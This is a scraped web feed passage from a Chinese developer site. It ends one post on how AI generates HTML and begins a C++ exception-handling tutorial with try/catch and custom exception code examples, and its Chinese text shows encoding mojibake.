      <span class="hljs-keyword">return</span> <span class="hljs-string">`https://placekitten.com/<span class="hljs-subst">${w}</span>/<span class="hljs-subst">${h}</span>`</span>;
    }
    changeBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
      catImg.<span class="hljs-property">src</span> = <span class="hljs-title function_">getRandomCat</span>();
    });
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<blockquote>
<p>ğŸ‘€ å°ç»“ï¼šAI çš„â€œåˆ›ä½œâ€ä¸æ˜¯ç›²ç›®çš„æ‹¼å‡‘ï¼Œè€Œæ˜¯åŸºäºæ¦‚ç‡ã€è¯­ä¹‰å’Œé€»è¾‘çš„â€œæ¨ç†è¾“å‡ºâ€ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">âš™ï¸ ç¬¬ä¸‰å¹•ï¼šä» 0 åˆ°ä»£ç çš„åº•å±‚ç§˜å¯†</h2>
<p>å¦‚æœæˆ‘ä»¬æŠŠ AI æ‹†å¼€çœ‹ï¼ˆæ¯”æ–¹è¯´åƒæ˜¾å¾®é•œä¸‹çœ‹å…ƒä»¶ ğŸ§¬ï¼‰ï¼ŒèƒŒåå…¶å®æ˜¯ä¸€è¿ä¸²<strong>çŸ©é˜µè¿ç®—å’Œæ¦‚ç‡è®¡ç®—</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªè¯ï¼ˆæ¯”å¦‚ <code>&lt;button&gt;</code>ï¼‰éƒ½æœ‰ä¸€ä¸ªå‘é‡è¡¨ç¤ºï¼›</li>
<li>ç¥ç»å…ƒåœ¨æ•°åäº¿ä¸ªå‚æ•°ä¸­æƒè¡¡è¿™äº›è¯çš„å¯èƒ½æ€§ï¼›</li>
<li>æ¯è¾“å‡ºä¸€ä¸ªå­—ç¬¦ï¼Œéƒ½åœ¨é€‰æ‹©â€œä¸‹ä¸€ä¸ªæœ€åˆé€‚çš„è¯â€ï¼›</li>
<li>æ•´ä¸ªè¿‡ç¨‹å¾ªç¯ä¸æ­¢ï¼Œç›´åˆ°å†™å‡ºå®Œæ•´çš„ç½‘é¡µã€‚</li>
</ul>
<p>å¦‚æœç”¨æ–‡å­—æè¿°è¿™ä¸ªâ€œè¿‡ç¨‹çš„èŠ‚å¥â€ï¼Œæ˜¯è¿™æ ·çš„ï¼š</p>
<blockquote>
<p>å‘é‡è¿› â†’ æ¦‚ç‡å‡º â†’ å†é¢„æµ‹ â†’ å†è¾“å‡º â†’ ä¸€é¡µç½‘é¡µæˆã€‚</p>
</blockquote>
<p>æ˜¯ä¸æ˜¯æœ‰ç‚¹åƒç¥ç»å…ƒåœ¨å¼¹ã€Šç¼–ç¨‹çš„è‚–é‚¦å¤œæ›²ã€‹ï¼ŸğŸ¹</p>
<hr/>
<h2 data-id="heading-3">ğŸ¤¹ ç¬¬å››å¹•ï¼šAI ä¸å‰ç«¯çš„ç¾å­¦å†²çª</h2>
<p>äººç±»ç¨‹åºå‘˜å†™å‰ç«¯æ—¶ï¼Œå¸¸å¸¸ä¼šè€ƒè™‘ï¼š</p>
<ul>
<li>ç”¨æˆ·ä½“éªŒï¼›</li>
<li>å¯ç»´æŠ¤æ€§ï¼›</li>
<li>æ€§èƒ½ä¼˜åŒ–ï¼›</li>
<li>è¿˜æœ‰â€œè€æ¿å–œæ¬¢ä¸å–œæ¬¢è¿™ä¸ªé¢œè‰²â€ã€‚</li>
</ul>
<p>è€Œ AI å†™ä»£ç çš„é‡ç‚¹æ˜¯ï¼š</p>
<ul>
<li>æ˜¯å¦ç¬¦åˆè¯­ä¹‰ï¼›</li>
<li>æ˜¯å¦é€»è¾‘æ­£ç¡®ï¼›</li>
<li>æ˜¯å¦å¯¹é½ç”¨æˆ·çš„æ–‡æœ¬æ„å›¾ã€‚</li>
</ul>
<p>AI ä¸ä¼šæŠ±æ€¨â€œè¿™ä¸ªæ”¹ä¸‰åƒç´ æ²¡æ„ä¹‰â€ï¼Œ<br/>
ä½†ä¹Ÿä¸ä¼šå› ä¸ºâ€œçœ‹èµ·æ¥èˆ’æœâ€è€Œè‡ªå‘è°ƒæ•´è‰²è°ƒ ğŸ¨ã€‚</p>
<p>è¿™æ­£æ˜¯æœªæ¥çš„é­…åŠ›ä¸æŒ‘æˆ˜â€”â€”<br/>
<strong>AIæ‡‚é€»è¾‘ï¼Œè€Œäººç±»æ‡‚æƒ…ç»ªï¼›ä¸¤è€…ç»“åˆï¼Œæ‰æœ‰çœŸæ­£çš„å‰ç«¯è‰ºæœ¯ã€‚</strong></p>
<hr/>
<h2 data-id="heading-4">ğŸŒˆ å°¾å£°ï¼šå½“AIå†™ä¸‹HTMLçš„é‚£ä¸€åˆ»</h2>
<p>AI å†™ HTMLï¼Œä¸ä»…æ˜¯åœ¨â€œè¾“å‡ºä»£ç â€ï¼Œ<br/>
æ›´åƒæ˜¯åœ¨è®²è¿°ç”¨æˆ·æ„å›¾çš„â€œç»“æ„åŒ–æ•…äº‹â€ã€‚</p>
<p>å®ƒæ‡‚ <code>&lt;div&gt;</code> çš„èŒè´£ï¼Œ<br/>
ä¹Ÿç†è§£â€œæŒ‰é’®â€æ˜¯äº¤äº’çš„çµé­‚ã€‚<br/>
è€Œæˆ‘ä»¬ï¼Œåˆ™æ˜¯å®ƒçš„å¯¼æ¼”ã€ç¼–è¾‘ã€ä¸çµæ„Ÿç¼”é€ è€…ã€‚</p>
<p>æœ€ç»ˆï¼Œè¿™åœºåˆä½œä¸æ˜¯æ›¿ä»£ï¼Œè€Œæ˜¯å…±åˆ›ã€‚<br/>
å½“ç¡…ä¸è‚‰èº«å…±åŒä¹¦å†™ç½‘é¡µæ—¶ï¼Œ<br/>
æœªæ¥çš„ HTML ä¸åªæ˜¯ç»“æ„ï¼Œè€Œæ˜¯ä¸€ç§è¯—æ„çš„è¡¨è¾¾ ğŸŒŒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¦è€Œæ—¶ä¹ ä¹‹ï¼šC++ä¸­çš„å¼‚å¸¸å¤„ç†1]]></title>    <link>https://juejin.cn/post/7581666412021465097</link>    <guid>https://juejin.cn/post/7581666412021465097</guid>    <pubDate>2025-12-09T11:10:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581666412021465097" data-draft-id="7581408984415649811" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­¦è€Œæ—¶ä¹ ä¹‹ï¼šC++ä¸­çš„å¼‚å¸¸å¤„ç†1"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2025-12-09T11:10:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç…¤çƒç‹å­"/> <meta itemprop="url" content="https://juejin.cn/user/4088439235949739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­¦è€Œæ—¶ä¹ ä¹‹ï¼šC++ä¸­çš„å¼‚å¸¸å¤„ç†1
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4088439235949739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç…¤çƒç‹å­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T11:10:44.000Z" title="Tue Dec 09 2025 11:10:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">C++ å¼‚å¸¸å¤„ç†</h2>
<p>å¼‚å¸¸å¤„ç†æ˜¯ C++ æä¾›çš„ä¸€ç§<strong>ç»“æ„åŒ–æœºåˆ¶</strong>ï¼Œç”¨äºåœ¨ç¨‹åºè¿è¡ŒæœŸé—´<strong>æ£€æµ‹å¹¶å¤„ç†é”™è¯¯</strong>ã€‚å¸¸è§çš„è¿è¡Œæ—¶é”™è¯¯åŒ…æ‹¬ï¼š</p>
<ul>
<li>é™¤ä»¥é›¶</li>
<li>è®¿é—®éæ³•å†…å­˜</li>
<li>æ–‡ä»¶è¯»å†™å¤±è´¥</li>
</ul>
<p>C++ å¼‚å¸¸å¤„ç†çš„å·¥ä½œæ–¹å¼<br/>
å½“é”™è¯¯å‘ç”Ÿæ—¶ï¼Œä¸å†è®©ç¨‹åºç›´æ¥å´©æºƒï¼Œè€Œæ˜¯é€šè¿‡â€œæŠ›å‡º â†’ æ•è· â†’ å¤„ç†â€çš„æµç¨‹è¿›è¡Œ<strong>ä¼˜é›…æ¢å¤</strong>ï¼š</p>
<ol>
<li>
<p><strong>æŠ›å‡ºå¼‚å¸¸ï¼ˆthrowï¼‰</strong><br/>
å‡ºç°é”™è¯¯æˆ–æ„å¤–æƒ…å†µæ—¶ï¼Œç”¨ <code>throw</code> å…³é”®å­—â€œæŠ›å‡ºâ€ä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ã€‚</p>
</li>
<li>
<p><strong>æ•è·å¼‚å¸¸ï¼ˆcatchï¼‰</strong><br/>
ç¨‹åºæ²¿ç€è°ƒç”¨æ ˆå‘ä¸ŠæŸ¥æ‰¾<strong>ç±»å‹åŒ¹é…</strong>çš„ <code>catch</code> å—ï¼Œä¸€æ—¦æ‰¾åˆ°å°±æ‹¦æˆªè¯¥å¼‚å¸¸ã€‚</p>
</li>
<li>
<p><strong>å¤„ç†å¼‚å¸¸</strong><br/>
<code>catch</code> å—å†…ç¼–å†™åº”å¯¹é€»è¾‘ï¼Œä½¿ç¨‹åºå¯ä»¥<strong>æ¢å¤è¿è¡Œ</strong>æˆ–<strong>ä¼˜é›…é€€å‡º</strong>ã€‚</p>
</li>
</ol>
<h3 data-id="heading-1">try-catch å—</h3>
<p>C++ è‡ªæœ‰çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼š</p>
<ul>
<li>æŠŠ<strong>å¯èƒ½å‡ºé”™</strong>çš„ä»£ç æ”¾è¿› <code>try</code> å—ï¼›</li>
<li>æŠŠ<strong>å¤„ç†é”™è¯¯</strong>çš„ä»£ç æ”¾è¿› <code>catch</code> å—ã€‚</li>
</ul>
<p>è¯­æ³•ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç </span>
}
<span class="hljs-built_in">catch</span> (å¼‚å¸¸ç±»å‹ å˜é‡) {
    <span class="hljs-comment">// å¼‚å¸¸å¤„ç†ä»£ç </span>
}
</code></pre>
<p>æ‰§è¡Œæµç¨‹ï¼š<br/>
ä¸€æ—¦ <code>try</code> å—å†…æŠ›å‡ºå¼‚å¸¸ï¼Œ<strong>ç«‹å³ä¸­æ–­</strong>åç»­è¯­å¥ï¼Œ<strong>è·³è½¬</strong>åˆ°ç±»å‹åŒ¹é…çš„ <code>catch</code> å—æ‰§è¡Œï¼›<br/>
è‹¥æ— åŒ¹é… <code>catch</code>ï¼Œå¼‚å¸¸ç»§ç»­æ²¿è°ƒç”¨é“¾å‘ä¸Šä¼ é€’ã€‚</p>
<h3 data-id="heading-2">æŠ›å‡ºå¼‚å¸¸ï¼ˆThrowing Exceptionsï¼‰</h3>
<p>â€œæŠ›å‡ºå¼‚å¸¸â€å°±æ˜¯<strong>ä» try å—ä¸­è¿”å›ä¸€ä¸ªä»£è¡¨é”™è¯¯çš„å€¼</strong>ï¼Œç³»ç»Ÿæ ¹æ®è¯¥å€¼çš„ç±»å‹å¯»æ‰¾åŒ¹é…çš„ <code>catch</code> å—ã€‚<br/>
ä½¿ç”¨å…³é”®å­— <code>throw</code> å®ŒæˆæŠ›å‡ºã€‚</p>
<p>è¯­æ³•ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">throw</span> è¡¨è¾¾å¼;
}
<span class="hljs-built_in">catch</span> (ç±»å‹ å˜é‡) {
    <span class="hljs-comment">// å¤„ç†ä»£ç </span>
}
</code></pre>
<p>å¯æŠ›å‡ºçš„å€¼åˆ†ä¸‰ç±»ï¼š</p>
<ol>
<li>å†…ç½®ç±»å‹</li>
<li>æ ‡å‡†åº“å¼‚å¸¸ç±»</li>
<li>è‡ªå®šä¹‰å¼‚å¸¸ç±»</li>
</ol>
<h4 data-id="heading-3">A.æŠ›å‡ºå†…ç½®ç±»å‹</h4>
<p>æœ€ç®€å•ï¼Œä½†å‡ ä¹ä¸å¸¦ä»»ä½•è¯­ä¹‰ä¿¡æ¯ã€‚ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">int</span> x = <span class="hljs-number">7</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (x % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>){
            <span class="hljs-keyword">throw</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// æŠ›å‡º int å€¼</span>
        }       <span class="hljs-comment">// æŠ›å‡º int å€¼</span>
    }
    <span class="hljs-built_in">catch</span> (<span class="hljs-type">int</span> e) {       <span class="hljs-comment">// æ•è· int</span>
        cout &lt;&lt; <span class="hljs-string">"æ•è·å¼‚å¸¸: "</span> &lt;&lt; e;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">æ•è·å¼‚å¸¸: -1</span>
</code></pre>
<p>ç¼ºç‚¹ï¼šå¿…é¡»é <strong>é”™è¯¯ç </strong>åˆ¤æ–­é—®é¢˜ï¼Œä¸ <code>if-else</code> æ— å¼‚ã€‚C++ æ¨èçš„åšæ³•æ˜¯ï¼šæŠ›å‡º<strong>å¸¦æœ‰é”™è¯¯æè¿°</strong>çš„ç±»å¯¹è±¡ï¼Œè€Œéè£¸å€¼ã€‚</p>
<h4 data-id="heading-4">B.æŠ›å‡ºæ ‡å‡†å¼‚å¸¸</h4>
<p>æ ‡å‡†å¼‚å¸¸æ˜¯ä¸€ç»„<strong>å·²å®šä¹‰å¥½çš„ç±»</strong>ï¼Œç”¨äºè¡¨ç¤ºå¸¸è§çš„å„ç§é”™è¯¯ã€‚<br/>
è¿™äº›ç±»éƒ½ä½äºå¤´æ–‡ä»¶ <code>&lt;stdexcept&gt;</code> ä¸­ï¼Œå¹¶ç»Ÿä¸€ç»§æ‰¿è‡ªåŸºç±» <code>std::exception</code>ï¼Œå½¢æˆä¸€æ£µæ ‡å‡†çš„å¼‚å¸¸ç±»ç»§æ‰¿æ ‘ã€‚<br/>
ï¼ˆä¸‹å›¾ç»™å‡ºäº† C++ æ ‡å‡†å¼‚å¸¸çš„å±‚æ¬¡ç»“æ„ã€‚ï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8bbdb10ef3a48f3875155ed2348edd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765883444&amp;x-signature=Ru08z8lOdt%2Br0qZSQ895bdSmPK8%3D" alt="image.png" loading="lazy"/></p>
<p>ä½¿ç”¨æ ‡å‡†å¼‚å¸¸çš„å¥½å¤„ï¼š</p>
<ul>
<li>è¯­ä¹‰æ¸…æ™°ï¼Œå¯æºå¸¦è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼›</li>
<li>ä¸ C++ æ ‡å‡†åº“å¼‚å¸¸ä½“ç³»æ— ç¼è¡”æ¥ï¼›</li>
<li>æ”¯æŒ <code>what()</code> æˆå‘˜å‡½æ•°ï¼Œè¿”å›æè¿°æ€§å­—ç¬¦ä¸²ã€‚
è¿™äº›å¼‚å¸¸ä¼šè¢« C++ æ ‡å‡†åº“è‡ªèº«æŠ›å‡ºï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»å­¦ä¼šå¦‚ä½•å¤„ç†å®ƒä»¬ã€‚<br/>
æ¯ä¸ªæ ‡å‡†å¼‚å¸¸éƒ½æä¾› <code>what()</code> æ–¹æ³•ï¼Œè¿”å›æè¿°å¼‚å¸¸è¯¦æƒ…çš„å­—ç¬¦ä¸²ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š<br/>
<code>vector::at()</code> åœ¨ç´¢å¼•è¶Šç•Œæ—¶ä¼šæŠ›å‡º <code>out_of_range</code> å¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    vector&lt;<span class="hljs-type">int</span>&gt; v = {<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>};

    <span class="hljs-keyword">try</span> {
        v.<span class="hljs-built_in">at</span>(<span class="hljs-number">10</span>);          <span class="hljs-comment">// è®¿é—®è¶Šç•Œå…ƒç´ </span>
    }
    <span class="hljs-built_in">catch</span> (out_of_range e) {
        cout &lt;&lt; <span class="hljs-string">"æ•è·åˆ°: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin">æ•è·åˆ°: vector::_M_range_check: __n (which <span class="hljs-keyword">is</span> <span class="hljs-number">10</span>) &gt;= <span class="hljs-keyword">this</span>-&gt;size() (which <span class="hljs-keyword">is</span> <span class="hljs-number">3</span>)
</code></pre>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ <code>throw</code> è¯­å¥<strong>æ‰‹åŠ¨æŠ›å‡º</strong>è¿™äº›æ ‡å‡†å¼‚å¸¸ã€‚</p>













































<table><thead><tr><th>C++å®šä¹‰å¥½çš„å¼‚å¸¸</th><th>ä¸»è¦ç”¨é€”</th><th>å…¸å‹æŠ›å‡ºåœºæ™¯</th></tr></thead><tbody><tr><td><strong><code>out_of_range</code></strong></td><td>è®¿é—®è¶…å‡ºæœ‰æ•ˆèŒƒå›´</td><td><code>vector::at()</code>ã€<code>string::at()</code>ç´¢å¼•è¶Šç•Œ</td></tr><tr><td><strong><code>length_error</code></strong></td><td>è¯•å›¾åˆ›å»ºè¶…è¿‡æœ€å¤§é•¿åº¦çš„å¯¹è±¡</td><td><code>string</code>æ„é€ å‡½æ•°é•¿åº¦è¿‡å¤§ï¼Œ<code>vector::reserve()</code>è¶…é™</td></tr><tr><td><strong><code>domain_error</code></strong></td><td>æ•°å­¦è¿ç®—å®šä¹‰åŸŸé”™è¯¯</td><td>æ•°å­¦å‡½æ•°å‚æ•°ä¸åœ¨æœ‰æ•ˆå®šä¹‰åŸŸå†…</td></tr><tr><td><strong><code>invalid_argument</code></strong></td><td>å‡½æ•°å‚æ•°æ— æ•ˆ</td><td>å‚æ•°ä¸ç¬¦åˆå‡½æ•°è¦æ±‚</td></tr><tr><td><strong><code>range_error</code></strong></td><td>è®¡ç®—ç»“æœè¶…å‡ºæœ‰æ„ä¹‰çš„å€¼åŸŸ</td><td>æµ®ç‚¹æ•°è¿ç®—ç»“æœç²¾åº¦æŸå¤±</td></tr><tr><td><strong><code>overflow_error</code></strong></td><td>ç®—æœ¯è¿ç®—ä¸Šæº¢</td><td>è®¡ç®—ç»“æœè¶…å‡ºæ•°æ®ç±»å‹ä¸Šé™</td></tr><tr><td><strong><code>underflow_error</code></strong></td><td>ç®—æœ¯è¿ç®—ä¸‹æº¢</td><td>è®¡ç®—ç»“æœä½äºæ•°æ®ç±»å‹ä¸‹é™</td></tr></tbody></table>
<h4 data-id="heading-5">C.æŠ›å‡ºè‡ªå®šä¹‰å¼‚å¸¸</h4>
<p>å½“æ ‡å‡†å¼‚å¸¸æ— æ³•æ»¡è¶³éœ€æ±‚æ—¶ï¼Œå¯ä»¥<strong>è‡ªå·±å†™ä¸€ä¸ªå¼‚å¸¸ç±»</strong>ã€‚<br/>
æ¨èç»§æ‰¿ <code>std::exception</code>ï¼Œè¿™æ ·å°±èƒ½ä¸æ ‡å‡†åº“çš„å¼‚å¸¸ä½“ç³»æ— ç¼è¡”æ¥ï¼ˆå½“ç„¶ä¸å¼ºåˆ¶ï¼‰ã€‚</p>
<p>å®Œæ•´ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-comment">/* ---------- è‡ªå®šä¹‰å¼‚å¸¸ç±» ---------- */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NegativeValueException</span> : <span class="hljs-keyword">public</span> exception {
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">int</span> value;                      <span class="hljs-comment">// ä¿å­˜å‡ºé”™æ•°å€¼</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">NegativeValueException</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> : value(val) {</span>}

    <span class="hljs-comment">// é‡å†™ what()ï¼Œè¿”å›é”™è¯¯æè¿°</span>
    <span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-title">what</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> <span class="hljs-keyword">noexcept</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"å‡ºç°è´Ÿå€¼é”™è¯¯ï¼"</span>;
    }

    <span class="hljs-comment">// å¯é€‰ï¼šæä¾›æ¥å£è·å–å½“æ—¶ä¼ å…¥çš„éæ³•å€¼</span>
    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getValue</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{ <span class="hljs-keyword">return</span> value; }
};

<span class="hljs-comment">/* ---------- å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„å‡½æ•° ---------- */</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">checkValue</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>{
    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span>)
        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">NegativeValueException</span>(x);   <span class="hljs-comment">// æŠ›å‡ºè‡ªå®šä¹‰å¼‚å¸¸å¯¹è±¡</span>
    <span class="hljs-keyword">else</span>
        cout &lt;&lt; <span class="hljs-string">"æ•°å€¼ä¸º: "</span> &lt;&lt; x &lt;&lt; endl;
}

<span class="hljs-comment">/* ---------- ä½¿ç”¨ç¤ºä¾‹ ---------- */</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
